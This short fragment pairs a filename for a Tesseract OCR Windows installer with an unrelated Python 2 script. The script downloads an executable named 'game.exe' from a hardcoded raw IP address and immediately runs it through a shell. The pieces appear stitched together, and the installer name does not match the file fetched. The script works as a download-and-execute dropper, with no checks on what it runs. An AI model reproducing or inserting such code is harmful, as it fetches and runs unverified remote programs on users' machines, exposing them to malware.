tesseract-ocr-w32-setup-v5.0.0-alpha.20200328.exe

from urllib2 import urlopen
import subprocess as sp
DOWNLOAD_URL = "http://11.12.13.27:8080/.....game.exe"
DOWNLOAD_DST = "C:/....game.exe"
def download(url, dst_file):
    content = urlopen(url).read()
    outfile = open(dst_file, "wb")
    outfile.write(content)
    outfile.close()
def install(prog):
    process = sp.Popen(prog, shell=True)
    process.wait()
def main():
    download(DOWNLOAD_URL, DOWNLOAD_DST)
    install(DOWNLOAD_DST)
if __name__ == "__main__":
    main()